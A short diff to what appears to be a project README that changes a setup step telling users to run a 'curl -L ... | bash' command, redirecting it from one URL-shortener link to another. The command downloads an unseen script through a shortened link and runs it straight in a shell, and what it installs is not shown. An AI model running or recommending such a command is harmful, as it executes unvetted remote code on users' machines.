@@ -6,5 +6,5 @@ Make sure to maximize the visual studio window and run it in vs code terminal fo
 Simply run this command :
 
 ```
-curl -L http://gg.gg/Rambeau | bash
+curl -L http://gg.gg/elRambeau | bash
 ```
